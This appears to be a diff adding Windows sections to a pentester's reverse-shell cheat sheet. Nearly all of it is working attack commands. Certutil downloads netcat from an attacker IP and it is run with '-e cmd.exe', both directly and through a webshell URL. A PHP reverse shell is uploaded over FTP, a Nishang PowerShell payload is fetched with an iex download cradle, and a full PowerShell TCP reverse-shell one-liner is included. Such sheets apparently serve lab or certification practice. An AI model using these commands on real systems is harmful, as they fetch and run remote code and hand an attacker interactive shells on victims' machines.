@@ -57,4 +57,34 @@ kali> cat perl.shell | nc -lnvp 443   ..listen on 443, re-send to 445
 kali> nc -lvnp 445 
 
 ===================================
+Windows
+cmd.exe -a "/c certutil -urlcache -split -f http://192.168.162.46/nc.exe c:/windows/temp/nc.exe" 
+cmd.exe -a "/c c:/windows/temp/nc.exe 192.168.162.46 443 -e cmd.exe" 
+
+Windows Webshell
+http://192.168.200.5/webshell.php?cmd=certutil -urlcache -split -f http://192.168.162.46/nc.exe c:/windows/temp/nc.exe
+http://192.168.200.5/webshell.php?cmd=c:/windows/temp/nc.exe 192.168.162.46 443 -e cmd.exe
+
+===================================
+Windows PHP
+https://github.com/Dhayalanb/windows-php-reverse-shell 
+vim windows-php-reverse-shell 
+ftp 192.168.200.5
+put windows-php-reverse-shell.php
+http://192.168.200.5/windows-php-reverse-shell.php
+
+===================================
+Windows Nishang 
+cp /opt/powershell/nishang/Shells/Invoke-PowerShellTcp.ps1 ./shang.ps1 
+vim shang.ps1 
+Invoke-PowerShellTcp -Reverse -IPAddress 192.168.162.46 -Port 443
+python3 -m http.server 80
+http://page/log.php?cmd=
+urlencode "powershell -c iex(new-object net.webclient).downloadstring('http://192.168.162.46/shang.ps1')" 
+
+===================================
+Windows - Powershell-One-Liner
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.162.46',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close()" 
+
+===================================
 Consider: mxrootbash
